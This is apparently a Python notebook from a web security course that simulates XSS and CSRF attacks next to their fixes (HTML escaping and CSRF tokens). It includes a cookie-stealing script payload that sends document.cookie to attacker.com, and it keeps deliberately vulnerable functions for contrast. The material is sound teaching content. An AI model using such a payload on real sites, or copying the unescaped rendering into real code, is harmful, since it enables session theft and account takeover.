In [1]:
# ========================
# Week 5 - Day 2: XSS & CSRF Attacks
# ========================

In [2]:
# Simulating XSS vulnerability and defense

def vulnerable_comment_system(user_input):
    # VULNERABLE — directly renders user input as HTML
    html = f"""
    <html>
    <body>
        <h2>Comments:</h2>
        <p>{user_input}</p>
    </body>
    </html>
    """
    return html

def secure_comment_system(user_input):
    # SECURE — escape HTML special characters
    escaped = (user_input
               .replace("&", "&amp;")
               .replace("<", "&lt;")
               .replace(">", "&gt;")
               .replace('"', "&quot;")
               .replace("'", "&#x27;"))
    
    html = f"""
    <html>
    <body>
        <h2>Comments:</h2>
        <p>{escaped}</p>
    </body>
    </html>
    """
    return html

# Normal comment
normal = "This product is great!"

# XSS attack payload
xss_attack = "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"

print("=== VULNERABLE SYSTEM ===")
print("Normal input:")
print(vulnerable_comment_system(normal))
print("\nXSS Attack:")
print(vulnerable_comment_system(xss_attack))

print("\n=== SECURE SYSTEM ===")
print("Normal input:")
print(secure_comment_system(normal))
print("\nXSS Attack (neutralized):")
print(secure_comment_system(xss_attack))

=== VULNERABLE SYSTEM ===
Normal input:

    <html>
    <body>
        <h2>Comments:</h2>
        <p>This product is great!</p>
    </body>
    </html>
    

XSS Attack:

    <html>
    <body>
        <h2>Comments:</h2>
        <p><script>document.location='http://attacker.com?cookie='+document.cookie</script></p>
    </body>
    </html>
    

=== SECURE SYSTEM ===
Normal input:

    <html>
    <body>
        <h2>Comments:</h2>
        <p>This product is great!</p>
    </body>
    </html>
    

XSS Attack (neutralized):

    <html>
    <body>
        <h2>Comments:</h2>
        <p>&lt;script&gt;document.location=&#x27;http://attacker.com?cookie=&#x27;+document.cookie&lt;/script&gt;</p>
    </body>
    </html>
    


In [1]:
import secrets

# Simulate session
session = {
    "user": "sharuk",
    "logged_in": True,
    "balance": 10000
}

# VULNERABLE — no CSRF protection
def vulnerable_transfer(amount, to_account):
    if session["logged_in"]:
        session["balance"] -= amount
        return f"❌ Transferred ₹{amount} to {to_account}! Balance: ₹{session['balance']}"
    return "Not logged in"

# SECURE — with CSRF token
csrf_token = secrets.token_hex(32)
print(f"CSRF Token generated: {csrf_token[:20]}...")

def secure_transfer(amount, to_account, provided_token):
    if not session["logged_in"]:
        return "Not logged in"
    
    # Verify CSRF token
    if provided_token != csrf_token:
        return "❌ CSRF Attack detected! Invalid token — request blocked!"
    
    session["balance"] -= amount
    return f"✅ Legitimate transfer: ₹{amount} to {to_account}. Balance: ₹{session['balance']}"

# Simulate attacks
print("\n=== VULNERABLE SYSTEM ===")
print("Attacker forges request:")
print(vulnerable_transfer(5000, "attacker_account"))

print("\n=== SECURE SYSTEM ===")
print("Attacker forges request (no token):")
print(secure_transfer(5000, "attacker_account", "fake_token"))

print("\nLegitimate user request (with correct token):")
print(secure_transfer(5000, "friend_account", csrf_token))

CSRF Token generated: 416d54f711ab5c55dd01...

=== VULNERABLE SYSTEM ===
Attacker forges request:
❌ Transferred ₹5000 to attacker_account! Balance: ₹5000

=== SECURE SYSTEM ===
Attacker forges request (no token):
❌ CSRF Attack detected! Invalid token — request blocked!

Legitimate user request (with correct token):
✅ Legitimate transfer: ₹5000 to friend_account. Balance: ₹0
